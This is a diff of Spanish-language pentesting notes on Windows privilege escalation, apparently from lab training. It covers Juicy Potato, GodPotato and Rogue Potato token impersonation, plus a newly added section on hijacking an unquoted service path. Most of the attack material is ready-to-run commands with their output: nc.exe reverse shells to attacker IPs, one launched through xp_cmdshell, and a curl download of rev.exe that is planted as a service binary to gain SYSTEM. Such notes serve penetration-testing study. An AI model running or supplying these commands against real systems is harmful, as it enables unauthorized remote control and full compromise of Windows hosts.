@@ -21,6 +21,7 @@
 - [Lista de privilegios interesantes](https://github.com/gtworek/Priv2Admin)
 
 ## SeImpersonate and SeAssignPrimaryToken
+
 ### SeImpersonate example - Juicy Potato
 
 - Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeImpersonate..
@@ -37,7 +38,9 @@
 - Es importante tener en cuenta los [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID), para extraerlos de la maquina podemos usar [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)
     - Entonces por ejemplo tenemos el siguiente comando: `.\Juicy.Potato.x86.exe -l 53375 -p c:\Windows\System32\cmd.exe -a "/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}`
 - Este CLSID es del proceso winmgmt dentro de windows server 2008 R2 Enterprise
+
 ```powershell
+
 C:\wamp\www>.\Juicy.Potato.x86.exe -l 53375 -p c:\Windows\System32\cmd.exe -a "/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
 Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 53375
 ....
@@ -46,12 +49,14 @@ Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 53375
 
 ``` 
 
+-----
 
 ### GodPotato
 - Afecta a versiones modernas si tenemos el privilegio SeImpersonatePrivilege.
 - [Repositorio](https://github.com/BeichenDream/GodPotato)
 
 ```powershell
+
 c:\Users\Public\GodPotato-NET4.exe
                                                                                                
     FFFFF                   FFF  FFFFFFF                                                       
@@ -108,14 +113,17 @@ c:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] process start with pid 4932
 nt authority\system
+
 ```
 
+-----
 
 
 ### Rogue Potato
 - RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.
 
-```PowerShell
+```powerShell
+
 SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.195 8443 -e cmd.exe" -t *
 output                                                       
 ----------------------------------------------------------   
@@ -153,7 +161,12 @@ whoami
 nt authority\system
 
 C:\Windows\system32>
+
 ``` 
+
+----
+
+
 
 ## SeDebugPrivilege
 
@@ -446,6 +459,26 @@ i686-w64-mingw32-g++ -shared -o malicious32.dll dllmain.cpp -lws2_32 -static-lib
 - O bien reiniciamos la maquina: `shutdown /r /t 0`
 
 -----
+
+## Abusar de binario de un servicio con un directorio con espacios y sin comillas
+- Muchas veces los servicios tienen un directorio con espacios y no tienen comillas, lo que nos permite abusar de esto.
+- Por ejemplo, si tenemos un servicio que tiene un directorio con espacios y no tiene comillas, podemos abusar de esto cambiando el path del servicio.
+
+```
+
+  Name             : DevService
+  DisplayName      : DevService
+  Description      : 
+  State            : Stopped
+  StartMode        : Auto
+  PathName         : C:\Skylark\Development Binaries 01\???????.exe
+```
+- En este caso podemos cambiar el path del servicio a un binario que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell.
+- `curl http://192.168.45.210/rev.exe -o Development.exe`
+- `sc query DevService`
+- `sc Start DevService`
+- `sc config DevService binPath= "C:\Skylark\Development Binaries 01\rev.exe"`: OPCIONAL! a veces no es necesario.
+- Y del otro lado tenemos el listener escuchando
 
 
 ## DLL injection
